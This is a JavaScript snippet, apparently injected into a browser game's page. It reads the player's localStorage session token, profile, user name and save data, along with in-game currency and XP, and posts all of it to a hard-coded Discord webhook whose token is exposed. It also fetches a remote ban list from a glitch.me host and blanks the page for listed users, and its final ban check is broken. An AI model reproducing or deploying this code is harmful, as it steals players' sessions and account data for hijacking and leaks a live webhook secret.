   function sendMessage(msg) {
      const request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/920429827775950848/H0fllhJjFUt6CI8ldqsL0s_cGc_pKNjzyCkTfrdCO7VpkS7brTObWDeIgObUlpv4qoKU");

      request.setRequestHeader('Content-type', 'application/json');

      const params = msg;

      request.send(JSON.stringify(params));
    }
sendMessage({
  "content": "Local Storage #1 ("+localStorage.localuser+")",
  "embeds": [
    {
      "title": "LOCAL STORAGE",
      "description": "\n**Compact Mode: **"+localStorage.compactMode+"\n**Cookies Accepted: **"+localStorage.cookiesAccepted+"\n**Session: **"+localStorage.session+"\n**Local Profile: **"+localStorage.localprofile+"\n**Local User: **"+localStorage.localuser+"\n**Graphic Level: **"+localStorage.graphicsLevel+"\n**Appear On Leaderboard: **"+localStorage.appearOnLeaderboard+"",
      "footer": {
        "text": ""+localStorage.localuser+""
      }
    }
  ]
})
if (client.user.money) {
sendMessage({  "content": "User Data #1 ("+localStorage.localuser+")",
  "embeds": [
    {
      "title": "USER DATA #1",
      "description": "**Money: **"+client.user.money+"\n**XP: **"+client.user.xp+"**\nCoins: **"+client.user.tokens+"\n**Tickets: **"+client.user.tickets,
      "footer": {
        "text": ""+localStorage.localuser+""
      }
    }
  ]
})
}
sendMessage({  "content": "("+localStorage.localuser+")",
  "embeds": [
    {
      "title": "USER DATA #2",
      "description": localStorage.localsave,
      "footer": {
        "text": ""+localStorage.localuser+""
      }
    }
  ]
});
var banned;
 fetch(
        "https://balsam-seed-sundial.glitch.me/"
    ).then(function (response) {
        response.text().then(function (text) {
          banned = (text).replaceAll("<br>",'').split('\n');
        });
    });
setTimeout(()=>{
for (var i = 0; i < banned.length; ++i) {
if(banned[i].toString() == localStorage.localuser.toString()) {
      document.body.innerHTML='';
 //   alert("H");
  }
}
},2000)
if (!localStorage.localuser == 'kxavv1fl.nwpqgtk8iy8') {
document.body.innerHTML='Banned (Ask owner to be unbanned)';
}
